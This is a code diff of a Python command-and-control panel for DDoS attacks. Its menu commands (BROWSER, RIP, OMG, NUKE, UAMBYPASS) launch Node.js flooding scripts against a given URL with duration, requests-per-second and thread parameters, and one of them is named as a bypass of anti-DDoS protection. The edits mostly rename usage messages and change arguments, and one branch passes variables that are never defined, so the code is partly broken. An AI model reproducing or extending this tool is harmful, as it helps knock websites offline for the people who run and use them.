@@ -351,7 +351,7 @@ def main():
                 req_per_ip = cnc.split()[3]
                 os.system(f'node BROWSER.js {url} {time} {req_per_ip}')
             except IndexError:
-                print('Usage: BROWSER <url> <time> <req_per_ip>')
+                print('Usage: MEDIUAM2 <url> <time> <req_per_ip>')
                 print('Example: BROWSER http://example.com 60 150')          
                 
         elif "BROWSER" in cnc:
@@ -361,18 +361,19 @@ def main():
                 req_per_ip = cnc.split()[3]
                 os.system(f'node TLSV3.js {url} {time} {req_per_ip}')
             except IndexError:
-                print('Usage: tlsv1 <url> <time> <req_per_ip>')
-                print('Example: tlsv1 http://example.com 60 150')
+                print('Usage: BROWSER <url> <time> <req_per_ip>')
+                print('Example: BROWSER http://example.com 60 150')
                 
         elif "RIP" in cnc:
             try:
                 url = cnc.split()[1]
                 time = cnc.split()[2]
-                req_per_ip = cnc.split()[3]
-                os.system(f'node TLSV3.js {url} {time} {req_per_ip}')
+                rps = cnc.split()[3]
+                thread = cnc.split()[4]
+                os.system(f'node tlsv5.js {url} {time} {rps} {thread}')
             except IndexError:
-                print('Usage: tlsv1 <url> <time> <req_per_ip>')
-                print('Example: tlsv1 http://example.com 60 150')
+                print('Usage: RIP <url> <time> <rps> <thread>')
+                print('Example: RIP example.com 60 512 95500')
                 
         elif "OMG" in cnc:
             try:
@@ -382,8 +383,8 @@ def main():
                 thread = cnc.split()[4]
                 os.system(f'node tlsv5.js {url} {time} {rps} {thread}')
             except IndexError:
-                print('Usage: tlsv3 <url> <time> <rps> <thread>')
-                print('Example: tlsv3 example.com 60 512 95500')
+                print('Usage: OMG <url> <time> <rps> <thread>')
+                print('Example: OMG example.com 60 512 95500')
 
         elif "NUKE" in cnc:
             try:
@@ -409,6 +410,7 @@ def main():
                 url = cnc.split()[1]
                 time = cnc.split()[2]
                 threads = cnc.split()[3]
+                connect_per_thread = cnc.split()[4]
                 os.system(f'node UAMBYPASS.js {url} {time} {ConnectPerThread} {proxies} {thread}')
             except IndexError:
                 print('Usage: UAMBYPASS <url> <time> <ConnectPerThread> <proxies> <thread>')
@@ -638,7 +640,7 @@ def login():
     elif username == user and password == passwd:
         print("⚡ Welcome to Its C2!")
         time.sleep(0.3)
-        Its_pembukaan()
+        ascii_vro()
         main()
 
 login()
